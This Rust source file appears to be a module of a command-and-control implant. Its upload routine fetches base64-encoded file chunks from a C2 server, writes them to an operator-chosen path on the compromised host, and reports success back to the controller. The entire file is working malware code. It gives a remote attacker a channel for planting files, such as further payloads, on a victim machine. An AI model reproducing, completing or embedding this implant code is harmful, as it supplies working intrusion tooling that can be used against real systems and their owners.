use serde::Deserialize;
use serde_json::Value;
use std::{fs::File, io::Write, path::PathBuf};
use base64::engine::general_purpose;
use base64::Engine;

const CHUNK_SIZE: usize = 4096;

#[derive(Deserialize)]
struct UploadParams {
    file_id: String,
    remote_path: String,
}

pub fn upload(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    // 1. Extract and validate fields
    let id = task.get("id")
        .and_then(Value::as_str)
        .ok_or("Missing `id` in task JSON")?;
    let raw_params = task.get("parameters")
        .and_then(Value::as_str)
        .ok_or("Missing `parameters` in task JSON")?;
    let params: UploadParams = serde_json::from_str(raw_params)?;

    // 2. Resolve the output path
    let mut path = PathBuf::from(&params.remote_path);
    if !path.is_absolute() {
        path = std::env::current_dir()?.join(&params.remote_path);
    }

    // 3. Open file for writing
    let mut f = File::create(&path)?;
    let mut chunk_num = 1;
    let mut total_chunks = 1;

    // 4. Download all chunks
    while chunk_num <= total_chunks {
        let payload = serde_json::json!({
            "action": "post_response",
            "responses": [{
                "upload": {
                    "chunk_size": CHUNK_SIZE,
                    "file_id": params.file_id,
                    "chunk_num": chunk_num,
                    "full_path": path.to_string_lossy()
                },
                "task_id": id
            }]
        })
        .to_string();

        let resp: Value = crate::transport::send_request_with_response(&payload)?;
        let entry = resp.get("responses")
            .and_then(Value::as_array)
            .and_then(|arr| arr.get(0))
            .ok_or("Missing responses[0] in C2 reply")?;

        total_chunks = entry.get("total_chunks")
            .and_then(Value::as_u64)
            .ok_or("Missing or invalid `total_chunks`")? as usize;
        let chunk_data = entry.get("chunk_data")
            .and_then(Value::as_str)
            .ok_or("Missing `chunk_data`")?;

        let bytes = general_purpose::STANDARD.decode(chunk_data)?;
        f.write_all(&bytes)?;

        chunk_num += 1;
    }

    // 5. Send final success
    let resp_json = serde_json::json!({
        "action": "post_response",
        "responses": [{
            "task_id": id,
            "user_output": format!("Wrote {} chunks to {}", total_chunks, path.display()),
            "status": "success"
        }]
    })
    .to_string();
    crate::transport::send_request(&resp_json)?;

    Ok(())
}
